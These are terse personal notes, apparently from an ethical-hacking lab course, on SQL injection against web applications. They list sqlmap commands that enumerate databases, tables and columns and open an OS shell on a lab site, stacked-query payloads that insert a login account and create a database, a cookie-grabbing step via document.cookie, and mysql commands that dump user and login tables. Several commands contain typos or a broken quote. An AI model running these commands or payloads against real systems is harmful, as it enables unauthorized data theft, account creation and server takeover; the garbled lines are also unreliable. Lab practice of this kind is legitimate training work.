Tools 
1) N staltker web vuln analysis
2) In the vuln web app go to console type document.cookie
	1) get the cookie value
	2) `sqlmap -u "http://IP?id=?" --cookie="X" --dbs`
to insert a username into the database we can user
`blah;insert into login values ('john',apple123');--`

then login using john as user  and apple123 as pass


To create a database 
`blah;create database mydatabase;--`  


1) sqlmap -r request.txt from burp 
2) sqlmap -r request.txt --dbs
3) sqlmap -r request.txt -D database_name --tables
4) sqlmap -r request.txt -D database_name -T table_name --columns
5) qlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell


1) mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
2) show databases;
3) use database_name
4) show tables ;
5) select * from users;
6) show dtabases;
7) use staff;
8) show tables;
9) select * from login;
10) select * from user;
11) When you have username and Password for the database.


https://www.youtube.com/watch?v=iD84waJKYh0


